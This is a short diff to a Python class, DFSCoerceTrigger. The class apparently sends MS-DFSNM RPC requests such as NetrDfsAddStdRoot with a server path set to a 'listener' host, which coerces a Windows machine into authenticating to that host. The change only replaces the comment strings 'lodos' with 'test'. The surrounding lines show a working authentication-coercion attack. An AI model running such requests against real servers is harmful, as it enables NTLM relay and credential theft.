@@ -397,8 +397,8 @@ class DFSCoerceTrigger:
             """
             request["ServerName"] = f"{listener}\x00"
             request["RootShare"] = "test\x00"
-            request["Comment"] = "lodos\x00"
-            request["Share"] = "x:\\lodos2005\x00"
+            request["Comment"] = "test\x00"
+            request["Share"] = "x:\\test\x00"
 
             dce.request(request)
         except Exception as e:
@@ -419,7 +419,7 @@ class DFSCoerceTrigger:
             request["pDfsPath"] = f"\\\\{listener}\\a\x00"
             request["pTargetPath"] = NULL
             request["MajorVersion"] = 0
-            request["pComment"] = "lodos\x00"
+            request["pComment"] = "test\x00"
             request["NewNamespace"] = 0
             request["Flags"] = 0
             dce.request(request)
@@ -482,7 +482,7 @@ class DFSCoerceTrigger:
             request = NetrDfsAddStdRoot()
             request["ServerName"] = f"{listener}\x00"
             request["RootShare"] = "test\x00"
-            request["Comment"] = "lodos\x00"
+            request["Comment"] = "test\x00"
             request["ApiFlags"] = 0
             dce.request(request)
         except Exception as e:
